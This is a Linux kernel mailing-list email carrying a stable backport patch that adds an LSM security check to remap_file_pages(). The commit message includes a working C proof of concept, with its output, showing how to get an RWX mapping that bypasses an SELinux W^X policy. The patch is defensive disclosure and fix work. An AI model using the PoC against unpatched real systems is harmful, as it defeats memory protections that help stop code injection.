Received: from smtp-fw-6002.amazon.com (smtp-fw-6002.amazon.com [52.95.49.90])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8B6FA1F4637
	for <patches@lists.linux.dev>; Mon, 10 Feb 2025 19:11:53 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=52.95.49.90
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1739214715; cv=none; b=EoKjcIb0g23FX9C5/8s9rAKWpfeCR8bSaztCLozWY7qfhW+gmS/CI4diQH37CqGGEN4Gcrp135hUR7WqX1XRsbMCI1o7scnJAa/13VWl+6IXSMKznkbh4SJdUliBEbfRodNpf0zTLTWeDahGPxqt0TvtLxV/u43hJJcFJ7COfmc=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1739214715; c=relaxed/simple;
	bh=/BMNqPljcr6cS7U4M73B12u42Wv3P4ejpcYY7SRf72Y=;
	h=From:To:CC:Subject:Date:Message-ID:MIME-Version:Content-Type; b=jaHjepM1wH4YvksBR2IcpduhNqhQWxQH+jdtX5syCOSTJODFzob4u6M20BWvWw9dOJuBPCsXdKUe9ZmErSHgl6MXYlqptzUUgELFNaNgL3oQdTr5Yao6kASujjq6MIYQ4TuwlXDDAGonJRgfzo91ut61bBDyN6nWsDmqoQJIWzs=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=amazon.de; spf=pass smtp.mailfrom=amazon.com; dkim=pass (1024-bit key) header.d=amazon.de header.i=@amazon.de header.b=JU78hxRy; arc=none smtp.client-ip=52.95.49.90
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=amazon.de
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=amazon.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=amazon.de header.i=@amazon.de header.b="JU78hxRy"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
  d=amazon.de; i=@amazon.de; q=dns/txt; s=amazon201209;
  t=1739214714; x=1770750714;
  h=from:to:cc:subject:date:message-id:mime-version:
   content-transfer-encoding;
  bh=p/4F4YelVDGq2BETB5VXnjJIdrBAtBykLWzRo8eIYGc=;
  b=JU78hxRymy37RzMGgNfJdN47ejN40eB4SEi/vCQ+fvJyY7QIoviVHmmj
   IxyfON5a5GrM+qlOzzSRl6b+jpV8qzTzXcBinQa3gn2pboOGCN/nwCZG3
   CVLAju3B4mqfIj7B1AbAl2qWamvomLcQ0oWPqbEaoWXpcgSiQiXj8HVf5
   c=;
X-IronPort-AV: E=Sophos;i="6.13,275,1732579200"; 
   d="scan'208";a="470982328"
Received: from iad12-co-svc-p1-lb1-vlan3.amazon.com (HELO smtpout.prod.us-west-2.prod.farcaster.email.amazon.dev) ([10.43.8.6])
  by smtp-border-fw-6002.iad6.amazon.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 10 Feb 2025 19:11:50 +0000
Received: from EX19MTAEUA001.ant.amazon.com [10.0.43.254:3331]
 by smtpin.naws.eu-west-1.prod.farcaster.email.amazon.dev [10.0.35.229:2525] with esmtp (Farcaster)
 id 29a927b1-0294-470e-8b26-88043f895fca; Mon, 10 Feb 2025 19:11:48 +0000 (UTC)
X-Farcaster-Flow-ID: 29a927b1-0294-470e-8b26-88043f895fca
Received: from EX19D028EUB001.ant.amazon.com (10.252.61.99) by
 EX19MTAEUA001.ant.amazon.com (10.252.50.223) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA) id 15.2.1258.39;
 Mon, 10 Feb 2025 19:11:48 +0000
Received: from EX19MTAUEB001.ant.amazon.com (10.252.135.35) by
 EX19D028EUB001.ant.amazon.com (10.252.61.99) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA) id 15.2.1258.39;
 Mon, 10 Feb 2025 19:11:48 +0000
Received: from email-imr-corp-prod-pdx-all-2b-22fa938e.us-west-2.amazon.com
 (10.43.8.2) by mail-relay.amazon.com (10.252.135.35) with Microsoft SMTP
 Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA) id
 15.2.1258.39 via Frontend Transport; Mon, 10 Feb 2025 19:11:47 +0000
Received: from dev-dsk-ptyadav-1c-43206220.eu-west-1.amazon.com (dev-dsk-ptyadav-1c-43206220.eu-west-1.amazon.com [172.19.91.144])
	by email-imr-corp-prod-pdx-all-2b-22fa938e.us-west-2.amazon.com (Postfix) with ESMTP id 276FCC0693;
	Mon, 10 Feb 2025 19:11:47 +0000 (UTC)
Received: by dev-dsk-ptyadav-1c-43206220.eu-west-1.amazon.com (Postfix, from userid 23027615)
	id B592D6669; Mon, 10 Feb 2025 19:11:46 +0000 (UTC)
From: Pratyush Yadav <ptyadav@amazon.de>
To: <stable@vger.kernel.org>
CC: Shu Han <ebpqwerty472123@gmail.com>, Greg Kroah-Hartman
	<gregkh@linuxfoundation.org>, <patches@lists.linux.dev>, Stephen Smalley
	<stephen.smalley.work@gmail.com>, Paul Moore <paul@paul-moore.com>, Bin Lan
	<bin.lan.cn@windriver.com>, Pratyush Yadav <ptyadav@amazon.de>
Subject: [PATCH 5.15] mm: call the security_mmap_file() LSM hook in remap_file_pages()
Date: Mon, 10 Feb 2025 19:11:40 +0000
Message-ID: <20250210191144.61428-1-ptyadav@amazon.de>
X-Mailer: git-send-email 2.47.1
Precedence: bulk
X-Mailing-List: patches@lists.linux.dev
List-Id: <patches.lists.linux.dev>
List-Subscribe: <mailto:patches+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:patches+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
Content-Type: text/plain

From: Shu Han <ebpqwerty472123@gmail.com>

commit ea7e2d5e49c05e5db1922387b09ca74aa40f46e2 upstream.

The remap_file_pages syscall handler calls do_mmap() directly, which
doesn't contain the LSM security check. And if the process has called
personality(READ_IMPLIES_EXEC) before and remap_file_pages() is called for
RW pages, this will actually result in remapping the pages to RWX,
bypassing a W^X policy enforced by SELinux.

So we should check prot by security_mmap_file LSM hook in the
remap_file_pages syscall handler before do_mmap() is called. Otherwise, it
potentially permits an attacker to bypass a W^X policy enforced by
SELinux.

The bypass is similar to CVE-2016-10044, which bypass the same thing via
AIO and can be found in [1].

The PoC:

$ cat > test.c

int main(void) {
	size_t pagesz = sysconf(_SC_PAGE_SIZE);
	int mfd = syscall(SYS_memfd_create, "test", 0);
	const char *buf = mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE,
		MAP_SHARED, mfd, 0);
	unsigned int old = syscall(SYS_personality, 0xffffffff);
	syscall(SYS_personality, READ_IMPLIES_EXEC | old);
	syscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0);
	syscall(SYS_personality, old);
	// show the RWX page exists even if W^X policy is enforced
	int fd = open("/proc/self/maps", O_RDONLY);
	unsigned char buf2[1024];
	while (1) {
		int ret = read(fd, buf2, 1024);
		if (ret <= 0) break;
		write(1, buf2, ret);
	}
	close(fd);
}

$ gcc test.c -o test
$ ./test | grep rwx
7f1836c34000-7f1836c35000 rwxs 00002000 00:01 2050 /memfd:test (deleted)

Link: https://project-zero.issues.chromium.org/issues/42452389 [1]
Cc: stable@vger.kernel.org
Signed-off-by: Shu Han <ebpqwerty472123@gmail.com>
Acked-by: Stephen Smalley <stephen.smalley.work@gmail.com>
[PM: subject line tweaks]
Signed-off-by: Paul Moore <paul@paul-moore.com>
Signed-off-by: Pratyush Yadav <ptyadav@amazon.de>
---
 mm/mmap.c | 4 ++++
 1 file changed, 4 insertions(+)

diff --git a/mm/mmap.c b/mm/mmap.c
index f8a2f15fc5a20..f774795c53bca 100644
--- a/mm/mmap.c
+++ b/mm/mmap.c
@@ -3035,8 +3035,12 @@ SYSCALL_DEFINE5(remap_file_pages, unsigned long, start, unsigned long, size,
 		flags |= MAP_LOCKED;
 
 	file = get_file(vma->vm_file);
+	ret = security_mmap_file(vma->vm_file, prot, flags);
+	if (ret)
+		goto out_fput;
 	ret = do_mmap(vma->vm_file, start, size,
 			prot, flags, pgoff, &populate, NULL);
+out_fput:
 	fput(file);
 out:
 	mmap_write_unlock(mm);
-- 
2.47.1

